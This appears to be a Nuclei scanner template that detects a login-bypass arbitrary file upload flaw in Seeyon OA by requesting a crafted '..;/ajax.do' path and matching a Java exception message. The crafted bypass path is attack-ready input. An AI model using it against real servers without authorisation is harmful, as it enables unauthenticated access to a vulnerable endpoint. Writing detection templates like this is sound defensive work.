id: ajax-upload-bypass

info:
  name: 致远OA ajax.do 登录绕过任意文件上传漏洞
  author: '0x404'
  severity: high
  description: 检测致远OA ajax.do 登录绕过任意文件上传漏洞
  tags: file-upload,seeyon

requests:
  - method: GET
    path:
      - "{{BaseURL}}/seeyon/thirdpartyController.do.css/..;/ajax.do"

    matchers:
      - type: word
        words:
          - "java 出现异常"
